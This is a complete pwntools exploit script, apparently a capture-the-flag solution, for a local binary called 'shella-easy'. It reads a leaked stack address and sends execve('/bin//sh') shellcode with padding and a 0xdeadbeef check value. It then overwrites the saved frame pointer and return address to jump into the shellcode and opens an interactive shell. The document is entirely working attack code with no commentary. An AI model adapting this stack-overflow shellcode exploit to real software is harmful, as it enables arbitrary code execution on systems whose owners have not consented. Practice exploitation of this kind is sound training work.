#!/usr/bin/env python3
from pwn import *

target = process("./shella-easy")
target.recvuntil(b"Yeah I'll have a ")
jmp_addr = int(target.recvline().split()[0], 16)


payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"
payload += b"A" * (0x40 - len(payload))
payload += b"\xef\xbe\xad\xde"
payload += b"A" * 0x8     # 0x4 padding + 0x4 overwrite old EBP
payload += p32(jmp_addr)

target.send(payload)
target.interactive()

